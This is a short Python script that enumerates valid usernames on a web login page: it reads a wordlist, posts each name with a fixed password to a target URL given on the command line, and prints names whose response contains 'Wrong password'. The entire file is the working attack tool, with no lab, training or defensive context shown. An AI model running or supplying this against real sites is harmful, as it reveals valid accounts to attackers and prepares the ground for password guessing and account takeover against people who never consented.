import requests
import sys

# Target url
url = sys.argv[1]

# User list
list_path = sys.argv[2]

try :
    with open(list_path, 'r') as list:
        for line in list:
            username = line.strip()
            if not username:
                continue

            data = {
                'username': username,
                'password': 'password'
            }

            response = requests.post(url, data=data)

            if 'Wrong password' in response.text:
                print(f'Unsername found: {username}')
            else:
                continue

except FileNotFoundError:
    print(f'Error: The file {list_path} does not exist')
except requests.RequestException as e:
    print(f'Error: An HTTP error occured: {e}')
